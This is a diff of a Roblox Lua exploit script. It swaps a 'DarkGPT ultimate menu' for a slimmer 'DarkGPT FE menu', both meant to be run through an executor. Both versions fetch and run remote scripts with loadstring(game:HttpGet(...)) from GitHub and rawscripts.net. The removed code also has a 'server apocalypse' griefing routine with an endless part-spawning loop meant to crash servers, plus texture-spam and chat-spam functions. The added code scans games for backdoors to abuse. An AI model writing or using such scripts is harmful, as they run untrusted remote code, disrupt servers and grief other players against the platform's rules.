@@ -1,335 +1,302 @@
 local targetTextureID = "126374845097716"
 local rbxAssetURL = "rbxassetid://" .. targetTextureID
 
--- FE Bypass execution functions
-local function executeFearlessGUI()
-    pcall(function()
-        local loadstringFunction = loadstring or load
-        local success, result = pcall(function()
-            return loadstringFunction(game:HttpGet("https://raw.githubusercontent.com/synkixr/FEARLESS-GUI/refs/heads/main/fearless-gui-by-synkixr", true))()
-        end)
-        
-        if not success then
-            -- Fallback to alternative execution method
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/synkixr/FEARLESS-GUI/refs/heads/main/fearless-gui-by-synkixr", true))()
-        end
-    end)
-end
-
-local function executeCaducusScript()
-    pcall(function()
-        local loadstringFunction = loadstring or load
-        local success, result = pcall(function()
-            return loadstringFunction(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Caducus-The-fallen-god-REQUIRES-REANIMATION-TO-WORK-47600", true))()
-        end)
-    end)
-end
-
--- Server Crash Apocalypse Function
-local function activateServerApocalypse()
-    local plr = game:GetService("Players").LocalPlayer
-    local char = plr.Character or plr.CharacterAdded:Wait()
-    local hum = char:WaitForChild("Humanoid")
-    local uis = game:GetService("UserInputService")
-    local rs = game:GetService("RunService")
-    local ts = game:GetService("TweenService")
-
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "APOCALYPSE_"..math.random(1,9999)
-    gui.Parent = game:GetService("CoreGui")
-
-    local function startMadMax()
-        for _, player in pairs(game.Players:GetPlayers()) do
-            if player.Character then
-                player.Character.Humanoid.WalkSpeed = 50
-                player.Character.Humanoid.JumpPower = 100
-                
-                rs.Heartbeat:Connect(function()
-                    local closest = nil
-                    local dist = math.huge
-                    for _, target in pairs(game.Players:GetPlayers()) do
-                        if target ~= player and target.Character then
-                            local d = (target.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
-                            if d < dist then
-                                closest = target
-                                dist = d
-                            end
-                        end
-                    end
-                    if closest then
-                        player.Character.HumanoidRootPart.Velocity = (closest.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Unit * 100
-                    end
-                end)
-            end
-        end
-    end
-
-    local function crashServer()
-        while true do
-            Instance.new("Part").Parent = workspace
-            game:GetService("Lighting").GlobalShadows = not game:GetService("Lighting").GlobalShadows
-            workspace.Gravity = math.random(-500,500)
-        end
-    end
-
-    local function zombieApocalypse()
-        for _, npc in pairs(workspace:GetDescendants()) do
-            if npc:FindFirstChild("Humanoid") then
-                npc.Humanoid.WalkSpeed = 25
-                for _, player in pairs(game.Players:GetPlayers()) do
-                    if player.Character then
-                        npc.HumanoidRootPart.Velocity = (player.Character.HumanoidRootPart.Position - npc.HumanoidRootPart.Position).Unit * 50
-                    end
-                end
-            end
-        end
-    end
-
-    local function radiationPoisoning()
-        rs.Heartbeat:Connect(function()
-            for _, player in pairs(game.Players:GetPlayers()) do
-                if player.Character then
-                    player.Character.Humanoid:TakeDamage(1)
-                    local rad = Instance.new("ParticleEmitter")
-                    rad.Texture = "rbxassetid://242563579"
-                    rad.Parent = player.Character.HumanoidRootPart
-                    game.Debris:AddItem(rad, 1)
-                end
-            end
-        end)
-    end
-
-    task.spawn(function()
-        wait(5)
-        
-        game:GetService("Lighting").TimeOfDay = "24:00:00"
-        game:GetService("Lighting").FogEnd = 100
-        game:GetService("Lighting").FogColor = Color3.new(1,0,0)
-        
-        local siren = Instance.new("Sound")
-        siren.SoundId = "rbxassetid://138199961"
-        siren.Looped = true
-        siren.Parent = workspace
-        siren:Play()
-        
-        game.StarterGui:SetCore("ChatMakeSystemMessage", {
-            Text = "☠️ APOCALYPSE ACTIVATED ☠️",
-            Color = Color3.new(1,0,0),
-            Font = Enum.Font.SourceSansBold,
-            FontSize = Enum.FontSize.Size48
-        })
-        
-        startMadMax()
-        wait(5)
-        zombieApocalypse()
-        wait(5)
-        radiationPoisoning()
-        wait(10)
-        crashServer()
-    end)
-end
-
--- Enhanced texture and sky replacement
-local function replaceAllAssets()
-    for _, obj in ipairs(workspace:GetDescendants()) do
-        if obj:IsA("Decal") or obj:IsA("Texture") then
-            pcall(function() 
-                obj.Texture = rbxAssetURL
-                if obj:IsA("Decal") then
-                    obj.Color3 = Color3.new(0, 1, 0)
-                end
-            end)
-        end
-    end
+-- Сохранение меню после ресета
+if not _G.DarkGPTMenu then
+    _G.DarkGPTMenu = true
     
-    pcall(function()
-        local lighting = game:GetService("Lighting")
-        local sky = lighting:FindFirstChildOfClass("Sky")
-        if not sky then
-            sky = Instance.new("Sky")
+    -- ========== ОСНОВНЫЕ ФУНКЦИИ ========== --
+
+    -- 1. Исправленный Caducus execution
+    local function executeCaducusScript()
+        pcall(function()
+            -- Прямое выполнение без лишних проверок
+            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Caducus-The-fallen-god-REQUIRES-REANIMATION-TO-WORK-47600", true))()
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("✅ Caducus injected", "All")
+        end)
+    end
+
+    -- 2. Улучшенный Backdoor Scanner
+    local function checkBackdoor()
+        pcall(function()
+            local backdoorFound = false
+            local scanLocations = {
+                game:GetService("ReplicatedStorage"),
+                game:GetService("Workspace"), 
+                game:GetService("Lighting"),
+                game:GetService("ServerScriptService"),
+                game:GetService("ServerStorage")
+            }
+            
+            local backdoorKeywords = {
+                "Backdoor", "Admin", "Script", "Execute", "Cmd", "Command",
+                "System", "Control", "Panel", "Hub", "Menu", "GUI"
+            }
+            
+            -- Сканируем все локации
+            for _, location in ipairs(scanLocations) do
+                for _, keyword in ipairs(backdoorKeywords) do
+                    if location:FindFirstChild(keyword) then
+                        backdoorFound = true
+                        break
+                    end
+                end
+                if backdoorFound then break end
+            end
+            
+            -- Обновляем текст в сканере
+            if game:GetService("CoreGui"):FindFirstChild("BackdoorScanner") then
+                local statusText = game:GetService("CoreGui").BackdoorScanner.MainFrame.StatusText
+                if backdoorFound then
+                    statusText.Text = "BACKDOOR: ✅ HAVE"
+                    statusText.TextColor3 = Color3.fromRGB(0, 255, 0)
+                else
+                    statusText.Text = "BACKDOOR: ❌ NONE"
+                    statusText.TextColor3 = Color3.fromRGB(255, 0, 0)
+                end
+            end
+            
+            -- Чат-сообщение
+            if backdoorFound then
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("✅ Backdoor: FOUND", "All")
+            else
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("❌ Backdoor: NOT FOUND", "All")
+            end
+        end)
+    end
+
+    -- 3. Остальные функции
+    local function changeFullUsername()
+        pcall(function()
+            game.Players.LocalPlayer.DisplayName = "c00lgreen"
+        end)
+    end
+
+    local function changePlayerSkin()
+        pcall(function()
+            local character = game.Players.LocalPlayer.Character
+            if character then
+                for _, part in ipairs(character:GetChildren()) do
+                    if part:IsA("BasePart") then
+                        part.Color = Color3.fromRGB(0, 255, 0)
+                    end
+                end
+            end
+        end)
+    end
+
+    local function changeSky()
+        pcall(function()
+            local lighting = game:GetService("Lighting")
+            local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky")
             sky.Parent = lighting
-        end
-        
-        local skyTextures = {"SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt", "SkyboxUp"}
-        for _, textureName in ipairs(skyTextures) do
-            sky[textureName] = rbxAssetURL
-        end
-        
-        sky.StarCount = 0
-        sky.SunAngularSize = 0
-        sky.MoonAngularSize = 0
-        lighting.Brightness = 2
-        lighting.GlobalShadows = false
-    end)
-    
-    for _, part in ipairs(workspace:GetDescendants()) do
-        if part:IsA("Part") or part:IsA("MeshPart") then
-            pcall(function()
-                part.Material = Enum.Material.Neon
-                part.Color = Color3.fromRGB(0, 255, 0)
-            end)
-        end
+            sky.SkyboxBk = rbxAssetURL
+            sky.SkyboxFt = rbxAssetURL
+            sky.SkyboxLf = rbxAssetURL
+            sky.SkyboxRt = rbxAssetURL
+        end)
     end
-    
-    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
-        "🚀 ALL TEXTURES AND SKY REPLACED!", 
-        "All"
-    )
-end
 
--- Display name changer
-local function changeDisplayName()
-    pcall(function()
-        game.Players.LocalPlayer.DisplayName = "c00lgreen"
-        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
-            "My new name: c00lgreen!", 
-            "All"
-        )
-    end)
-end
-
--- Player tag system
-local function createPlayerTag(player)
-    if player.Character then
-        local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
-        if humanoidRootPart then
-            for _, tag in ipairs(humanoidRootPart:GetChildren()) do
-                if tag.Name == "c00lgreenTag" then
-                    tag:Destroy()
-                end
+    local function switchBodyType()
+        pcall(function()
+            local humanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
+            if humanoid then
+                humanoid.RigType = humanoid.RigType == Enum.HumanoidRigType.R6 and Enum.HumanoidRigType.R15 or Enum.HumanoidRigType.R6
             end
-            
-            local billboardGui = Instance.new("BillboardGui")
-            billboardGui.Name = "c00lgreenTag"
-            billboardGui.Size = UDim2.new(0, 200, 0, 50)
-            billboardGui.StudsOffset = Vector3.new(0, 3, 0)
-            billboardGui.AlwaysOnTop = true
-            billboardGui.Adornee = humanoidRootPart
-            billboardGui.Parent = humanoidRootPart
-            
-            local textLabel = Instance.new("TextLabel")
-            textLabel.Size = UDim2.new(1, 0, 1, 0)
-            textLabel.Text = "c00Lgreen"
-            textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-            textLabel.BackgroundTransparency = 1
-            textLabel.Font = Enum.Font.SourceSansBold
-            textLabel.TextSize = 20
-            textLabel.Parent = billboardGui
+        end)
+    end
+
+    -- ========== СОЗДАНИЕ ОСНОВНОГО МЕНЮ ========== --
+
+    local function createMainMenu()
+        if game:GetService("CoreGui"):FindFirstChild("DarkGPT_FE_Menu") then
+            game:GetService("CoreGui").DarkGPT_FE_Menu:Destroy()
         end
+
+        local ScreenGui = Instance.new("ScreenGui")
+        ScreenGui.Name = "DarkGPT_FE_Menu"
+        ScreenGui.Parent = game:GetService("CoreGui")
+        ScreenGui.ResetOnSpawn = false
+
+        local MainFrame = Instance.new("Frame")
+        MainFrame.Size = UDim2.new(0.45, 0, 0.75, 0)
+        MainFrame.Position = UDim2.new(0.02, 0, 0.15, 0)
+        MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        MainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+        MainFrame.BorderSizePixel = 2
+        MainFrame.Active = true
+        MainFrame.Parent = ScreenGui
+
+        local Title = Instance.new("TextLabel")
+        Title.Size = UDim2.new(1, 0, 0.07, 0)
+        Title.Text = "☠️ DARKGPT MENU"
+        Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+        Title.BackgroundTransparency = 1
+        Title.Font = Enum.Font.SourceSansBold
+        Title.TextSize = 14
+        Title.Parent = MainFrame
+
+        -- Кнопки основного меню
+        local buttons = {
+            {Text = "⚡ CADUCUS FE", Pos = 0.08, Color = Color3.fromRGB(139, 0, 139), Func = executeCaducusScript},
+            {Text = "🚀 CHANGE NAME", Pos = 0.16, Color = Color3.fromRGB(255, 50, 50), Func = changeFullUsername},
+            {Text = "🎭 CHANGE SKIN", Pos = 0.24, Color = Color3.fromRGB(0, 150, 255), Func = changePlayerSkin},
+            {Text = "🌌 CHANGE SKY", Pos = 0.32, Color = Color3.fromRGB(100, 0, 200), Func = changeSky},
+            {Text = "🔁 BODY TYPE", Pos = 0.40, Color = Color3.fromRGB(200, 100, 0), Func = switchBodyType},
+            {Text = "🔄 SCAN NOW", Pos = 0.48, Color = Color3.fromRGB(255, 165, 0), Func = checkBackdoor}
+        }
+
+        for _, btn in ipairs(buttons) do
+            local button = Instance.new("TextButton")
+            button.Size = UDim2.new(0.9, 0, 0.1, 0)
+            button.Position = UDim2.new(0.05, 0, btn.Pos, 0)
+            button.Text = btn.Text
+            button.BackgroundColor3 = btn.Color
+            button.TextColor3 = Color3.fromRGB(255, 255, 255)
+            button.Font = Enum.Font.SourceSansBold
+            button.TextSize = 11
+            button.BorderSizePixel = 1
+            button.BorderColor3 = Color3.fromRGB(50, 50, 50)
+            button.Parent = MainFrame
+            button.MouseButton1Click:Connect(btn.Func)
+        end
+
+        -- Кнопка закрытия
+        local CloseButton = Instance.new("TextButton")
+        CloseButton.Size = UDim2.new(0.12, 0, 0.07, 0)
+        CloseButton.Position = UDim2.new(0.84, 0, 0.005, 0)
+        CloseButton.Text = "X"
+        CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        CloseButton.Font = Enum.Font.SourceSansBold
+        CloseButton.TextSize = 12
+        CloseButton.Parent = MainFrame
+        CloseButton.MouseButton1Click:Connect(function()
+            ScreenGui:Destroy()
+        end)
+
+        -- Система перемещения основного меню
+        local UserInputService = game:GetService("UserInputService")
+        local dragging = false
+        local dragStart = Vector3.new()
+        local startPos = UDim2.new()
+
+        MainFrame.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.Touch then
+                dragging = true
+                dragStart = Vector3.new(input.Position.X, input.Position.Y, 0)
+                startPos = MainFrame.Position
+            end
+        end)
+
+        MainFrame.InputEnded:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.Touch then
+                dragging = false
+            end
+        end)
+
+        UserInputService.InputChanged:Connect(function(input)
+            if dragging and input.UserInputType == Enum.UserInputType.Touch then
+                local delta = Vector3.new(input.Position.X, input.Position.Y, 0) - dragStart
+                MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+            end
+        end)
     end
+
+    -- ========== СОЗДАНИЕ СКАНЕРА БЭКДОРА ========== --
+
+    local function createBackdoorScanner()
+        if game:GetService("CoreGui"):FindFirstChild("BackdoorScanner") then
+            game:GetService("CoreGui").BackdoorScanner:Destroy()
+        end
+
+        local ScannerGui = Instance.new("ScreenGui")
+        ScannerGui.Name = "BackdoorScanner"
+        ScannerGui.Parent = game:GetService("CoreGui")
+        ScannerGui.ResetOnSpawn = false
+
+        local ScannerFrame = Instance.new("Frame")
+        ScannerFrame.Size = UDim2.new(0.25, 0, 0.1, 0)
+        ScannerFrame.Position = UDim2.new(0.75, 0, 0.02, 0)
+        ScannerFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+        ScannerFrame.BorderColor3 = Color3.fromRGB(100, 100, 100)
+        ScannerFrame.BorderSizePixel = 2
+        ScannerFrame.Active = true
+        ScannerFrame.Parent = ScannerGui
+
+        local Title = Instance.new("TextLabel")
+        Title.Size = UDim2.new(1, 0, 0.3, 0)
+        Title.Text = "BACKDOOR SCANNER"
+        Title.TextColor3 = Color3.fromRGB(255, 255, 0)
+        Title.BackgroundTransparency = 1
+        Title.Font = Enum.Font.SourceSansBold
+        Title.TextSize = 12
+        Title.Parent = ScannerFrame
+
+        local StatusText = Instance.new("TextLabel")
+        StatusText.Name = "StatusText"
+        StatusText.Size = UDim2.new(1, 0, 0.5, 0)
+        StatusText.Position = UDim2.new(0, 0, 0.3, 0)
+        StatusText.Text = "SCANNING..."
+        StatusText.TextColor3 = Color3.fromRGB(255, 255, 255)
+        StatusText.BackgroundTransparency = 1
+        StatusText.Font = Enum.Font.SourceSansBold
+        StatusText.TextSize = 14
+        StatusText.Parent = ScannerFrame
+
+        local ScanButton = Instance.new("TextButton")
+        ScanButton.Size = UDim2.new(0.8, 0, 0.3, 0)
+        ScanButton.Position = UDim2.new(0.1, 0, 0.65, 0)
+        ScanButton.Text = "🔍 SCAN"
+        ScanButton.BackgroundColor3 = Color3.fromRGB(50, 50, 200)
+        ScanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        ScanButton.Font = Enum.Font.SourceSansBold
+        ScanButton.TextSize = 12
+        ScanButton.Parent = ScannerFrame
+        ScanButton.MouseButton1Click:Connect(checkBackdoor)
+
+        -- Система перемещения сканера
+        local draggingScanner = false
+        local scannerDragStart = Vector3.new()
+        local scannerStartPos = UDim2.new()
+
+        ScannerFrame.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.Touch then
+                draggingScanner = true
+                scannerDragStart = Vector3.new(input.Position.X, input.Position.Y, 0)
+                scannerStartPos = ScannerFrame.Position
+            end
+        end)
+
+        ScannerFrame.InputEnded:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.Touch then
+                draggingScanner = false
+            end
+        end)
+
+        UserInputService.InputChanged:Connect(function(input)
+            if draggingScanner and input.UserInputType == Enum.UserInputType.Touch then
+                local delta = Vector3.new(input.Position.X, input.Position.Y, 0) - scannerDragStart
+                ScannerFrame.Position = UDim2.new(scannerStartPos.X.Scale, scannerStartPos.X.Offset + delta.X, scannerStartPos.Y.Scale, scannerStartPos.Y.Offset + delta.Y)
+            end
+        end)
+
+        -- Автопроверка при создании
+        checkBackdoor()
+    end
+
+    -- Создаем оба меню
+    createMainMenu()
+    createBackdoorScanner()
+
+    -- Автовосстановление
+    game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
+        task.wait(3)
+        if not game:GetService("CoreGui"):FindFirstChild("DarkGPT_FE_Menu") then
+            createMainMenu()
+        end
+        if not game:GetService("CoreGui"):FindFirstChild("BackdoorScanner") then
+            createBackdoorScanner()
+        end
+    end)
 end
-
-local function tagAllPlayers()
-    for _, player in ipairs(game.Players:GetPlayers()) do
-        createPlayerTag(player)
-    end
-    for i = 1, 3 do
-        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
-            "c00lgreen is back", 
-            "All"
-        )
-        wait(0.5)
-    end
-end
-
--- Create complete GUI
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "DarkGPT_UltimateMenu"
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-
-local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0.5, 0, 0.8, 0)
-MainFrame.Position = UDim2.new(0.02, 0, 0.15, 0)
-MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-MainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-MainFrame.Parent = ScreenGui
-
--- Buttons in order
-local buttons = {
-    {
-        Name = "APOCALYPSE",
-        Text = "☢️ SERVER APOCALYPSE",
-        Position = UDim2.new(0.05, 0, 0.03, 0),
-        Color = Color3.fromRGB(255, 0, 0),
-        Function = activateServerApocalypse
-    },
-    {
-        Name = "CADUCUS",
-        Text = "⚡ CADUCUS FE GOD",
-        Position = UDim2.new(0.05, 0, 0.15, 0),
-        Color = Color3.fromRGB(139, 0, 139),
-        Function = executeCaducusScript
-    },
-    {
-        Name = "FEARLESS",
-        Text = "⚡ FEARLESS GUI (SYNKIXR)",
-        Position = UDim2.new(0.05, 0, 0.27, 0),
-        Color = Color3.fromRGB(255, 165, 0),
-        Function = executeFearlessGUI
-    },
-    {
-        Name = "TEXTURES",
-        Text = "💀 DECAL & SKY SPAM",
-        Position = UDim2.new(0.05, 0, 0.39, 0),
-        Color = Color3.fromRGB(255, 0, 0),
-        Function = replaceAllAssets
-    },
-    {
-        Name = "NAME",
-        Text = "🎭 BECOME c00lgreen",
-        Position = UDim2.new(0.05, 0, 0.51, 0),
-        Color = Color3.fromRGB(0, 150, 255),
-        Function = changeDisplayName
-    },
-    {
-        Name = "TAGS",
-        Text = "🏷️ TAG ALL PLAYERS",
-        Position = UDim2.new(0.05, 0, 0.63, 0),
-        Color = Color3.fromRGB(0, 255, 0),
-        Function = tagAllPlayers
-    }
-}
-
-for _, btn in ipairs(buttons) do
-    local button = Instance.new("TextButton")
-    button.Size = UDim2.new(0.9, 0, 0.12, 0)
-    button.Position = btn.Position
-    button.Text = btn.Text
-    button.BackgroundColor3 = btn.Color
-    button.TextColor3 = Color3.fromRGB(255, 255, 255)
-    button.Font = Enum.Font.SourceSansBold
-    button.TextSize = 12
-    button.Parent = MainFrame
-    button.MouseButton1Click:Connect(btn.Function)
-end
-
--- Mobile drag system
-local dragInput, dragStart, startPos
-MainFrame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.Touch then
-        dragStart = input.Position
-        startPos = MainFrame.Position
-    end
-end)
-
-MainFrame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
-    end
-end)
-
-game:GetService("UserInputService").InputChanged:Connect(function(input)
-    if input == dragInput and dragStart then
-        local delta = input.Position - dragStart
-        MainFrame.Position = UDim2.new(
-            startPos.X.Scale, 
-            startPos.X.Offset + delta.X,
-            startPos.Y.Scale, 
-            startPos.Y.Offset + delta.Y
-        )
-    end
-end)
-
--- Auto-execute
-task.wait(2)
-replaceAllAssets()
